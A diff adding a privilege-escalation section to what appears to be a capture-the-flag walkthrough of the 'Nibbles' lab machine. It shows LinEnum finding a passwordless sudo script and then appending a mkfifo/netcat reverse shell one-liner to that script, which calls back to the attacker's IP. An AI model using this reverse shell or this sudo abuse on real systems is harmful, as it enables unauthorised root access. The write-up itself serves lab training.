@@ -121,4 +121,26 @@ We now have an upgraded reverse shell! Let's try to escalate things. Again, see 
 
 We'll begin with more enumeration. We'll need to find something to exploit to find escalate our privileges! To do this, we'll use [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh). We begin on our attacker machine by downloading this script, then starting a `python` server with `sudo python3 -m http.server 8080`. Then, from our remote shell, we can download the file with `wget http://[our-ip]/LinEnum.sh`. Make the script executable with `chmod +x LinEnum.sh` and then run it.
 
+Scrolling through the output, we'll find something promising quite early on:
 
+```shellsession
+[+] We can sudo without supplying a password!
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+[+] Possible sudo pwnage!
+/home/nibbler/personal/stuff/monitor.sh
+```
+
+The `nibbler` user is able to run `monitor.sh` with `root` privilege. When we first gained our shell, we noticed the `user.txt` file containing a flag, but we glossed over `personal.zip`. Unzipping this and looking inside reveals `monitor.sh`, which `nibbler` is able to edit (we can check this with `ls -l`) . So, we have a file we're able to edit and run as `root`. That seems pretty dangerous!
+
+Before we do anything, **we must make sure to make a backup of the file and only append changes to the end to avoid overwriting it and causing a disruption!**
+
+Let's append a reverse shell line to the end and execute with `sudo`:
+
+```shellsession
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [our ip] 8443 >/tmp/f' | tee -a monitor.sh
+```
